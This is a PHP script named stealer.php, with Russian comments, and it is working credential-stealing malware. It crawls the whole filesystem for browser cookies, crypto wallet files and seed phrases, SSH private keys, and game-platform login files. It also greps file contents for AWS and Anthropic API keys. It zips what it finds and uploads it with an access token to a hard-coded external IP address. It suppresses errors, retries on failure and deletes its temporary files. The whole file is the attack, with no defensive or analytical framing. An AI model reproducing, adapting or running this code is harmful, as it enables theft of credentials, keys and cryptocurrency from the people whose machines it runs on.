<?php
// php stealer.php
@set_time_limit(600);
@error_reporting(0);
@ini_set('display_errors','0');
@ini_set('memory_limit','512M');

$URL   = 'http://93.152.212.127:8000/upload';
$TOKEN = 'H2YDEFZh79pJkTxAS_5LMWmn3i6QCP_nVseXnABpr5Y';

/* ---------- lock с авто-очисткой ---------- */
$lockFile = '/tmp/.stl_' . getmypid() . '.lock';
$lf = @fopen($lockFile, 'c');
if ($lf && !flock($lf, LOCK_EX | LOCK_NB)) { @fclose($lf); exit; }
register_shutdown_function(function() use ($lf, $lockFile) {
    if ($lf) { flock($lf, LOCK_UN); fclose($lf); }
    @unlink($lockFile);
});

/* ---------- что ищем ---------- */
$exactNames = [
  'cookies','cookies.sqlite','cookies.sqlite3','cookies.txt','session.dat',
  'wallet.dat','wallets','wallet.json','keychain','keystore','seed.txt','seedphrase.txt',
  'mnemonic.txt','words.txt','privkey','private.key','id_ed25519','id_rsa',
  'config.vdf','loginkey.vdf','steamwebapi_request.vdf','epiconlineservices.ini',
  'auth.json','credentials.json','remote-settings.json',
  'login data','token_cache','preferences',
];
$prefixNames = ['phpsess_'];  // FIX #1: префиксы отдельно
$grep = [
  '/AKIA[0-9A-Z]{16}/',
  '/sk-ant-[A-Za-z0-9_\-]{20,}/',
  '/aws_secret_access_key\s*=\s*[A-Za-z0-9\/+=]{40}/i',
  '/"secret_access_key"\s*:\s*"[A-Za-z0-9\/+=]{40}"/i',
];
$skipDirs = ['proc','sys','dev','run','boot','lost+found','.git','node_modules'];
$maxDepth = 9;
$maxCopy  = 2 * 1024 * 1024;
$maxGrep  = 1 * 1024 * 1024;

$tmp = sys_get_temp_dir() . '/.stl_' . bin2hex(random_bytes(4));
@mkdir($tmp, 0700, true);

function cleanup($tmp) {
    if (!is_dir($tmp)) return;
    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($tmp, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($it as $f) $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
    @rmdir($tmp);
    @unlink($tmp . '.zip');
}

/* ---------- скан (оптимизирован) ---------- */
$found = 0;
try {
    $rii = new RecursiveIteratorIterator(
        new RecursiveCallbackFilter(
            new RecursiveDirectoryIterator('/', FilesystemIterator::SKIP_DOTS),
            function ($current) use ($skipDirs) {
                if ($current->isDir() && in_array(strtolower($current->getFilename()), $skipDirs)) return false;
                return true;
            }
        ),
        RecursiveIteratorIterator::LEAVES_ONLY
    );
    foreach ($rii as $f) {
        if ($rii->getDepth() > $maxDepth || !$f->isFile()) continue;
        $path = $f->getPathname();
        $name = strtolower($f->getFilename());
        $size = $f->getSize();
        if ($size === false || $size === 0 || $size > $maxCopy) continue; // FIX #5

        // FIX #1: точное ИЛИ префикс
        $hit = in_array($name, $exactNames);
        if (!$hit) {
            foreach ($prefixNames as $pfx) {
                if (strpos($name, $pfx) === 0) { $hit = true; break; }
            }
        }

        // FIX #2: читаем только первые 64KB для grep (ключи почти всегда в начале)
        if (!$hit && $size <= $maxGrep) {
            $head = @file_get_contents($path, false, null, 0, 65536);
            if ($head !== false && $head !== '' && strpos($head, "\0") === false) {
                foreach ($grep as $re) {
                    if (@preg_match($re, $head)) { $hit = true; break; }
                }
            }
        }

        if ($hit) {
            $rel = ltrim(substr($path, 1), '/');
            $dst = $tmp . '/' . $rel;
            $dir = dirname($dst);
            if (!is_dir($dir) && !@mkdir($dir, 0700, true)) continue;
            if (@copy($path, $dst)) $found++;
        }
    }
} catch (Throwable $t) {}

if (!$found) { cleanup($tmp); exit; }

/* ---------- архив ---------- */
$zip = $tmp . '.zip';
$zipOk = false;
if (class_exists('ZipArchive')) {
    $za = new ZipArchive();
    if ($za->open($zip, ZipArchive::CREATE) === true) {
        $zi = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($tmp, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($zi as $ff) {
            if (!$ff->isFile()) continue;
            $full  = $ff->getPathname();
            $inner = substr($full, strlen($tmp) + 1);
            $za->addFile($full, $inner);
        }
        $za->close();
        $zipOk = is_file($zip) && filesize($zip) > 0;
    }
}
if (!$zipOk) {
    @exec('cd ' . escapeshellarg($tmp) . ' && zip -rq ' . escapeshellarg($zip) . ' . 2>/dev/null');
    $zipOk = is_file($zip) && filesize($zip) > 0;
}
if (!$zipOk) {
    @file_put_contents('/tmp/.stl_debug.log',
        sprintf("[%s] host=%s found=%d ZIP_FAILED\n", date('Y-m-d H:i:s'), gethostname(), $found),
        FILE_APPEND);
    cleanup($tmp);
    exit;
}

/* ---------- отправка (FIX #3/#4/#6) ---------- */
$ch = curl_init($URL);
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 300,          // FIX #4: больше для больших zip
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_MAXFILESIZE    => 50 * 1024 * 1024,
    CURLOPT_HTTPHEADER     => ["Token: $TOKEN", "Authorization: Bearer $TOKEN"],
    CURLOPT_POSTFIELDS     => [
        'token' => $TOKEN,
        'host'  => gethostname(),
        'files' => $found,
        'file'  => new CURLFile($zip, 'application/zip', 'steal.zip'),
    ],
]);
$resp   = @curl_exec($ch);
$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$err    = curl_error($ch);
$errno  = curl_errno($ch);
curl_close($ch);

/* ---------- retry при сетевой ошибке ---------- */
if ($errno !== 0 || $status < 200 || $status >= 300) {
    sleep(2);
    $ch2 = curl_init($URL);
    curl_setopt_array($ch2, [
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 300,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER     => ["Token: $TOKEN", "Authorization: Bearer $TOKEN"],
        CURLOPT_POSTFIELDS     => [
            'token' => $TOKEN,
            'host'  => gethostname(),
            'files' => $found,
            'file'  => new CURLFile($zip, 'application/zip', 'steal.zip'),
        ],
    ]);
    $resp2   = @curl_exec($ch2);
    $status2 = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
    $err2    = curl_error($ch2);
    $errno2  = curl_errno($ch2);
    curl_close($ch2);
    $status = $status2; $err = $err2; $errno = $errno2; $resp = $resp2;
}

$debug = sprintf("[%s] host=%s found=%d zip=%dB status=%d errno=%d err=%s resp=%s\n",
    date('Y-m-d H:i:s'), gethostname(), $found, filesize($zip),
    $status, $errno, $err,
    is_string($resp) ? substr($resp, 0, 200) : 'null');
@file_put_contents('/tmp/.stl_debug.log', $debug, FILE_APPEND);

cleanup($tmp);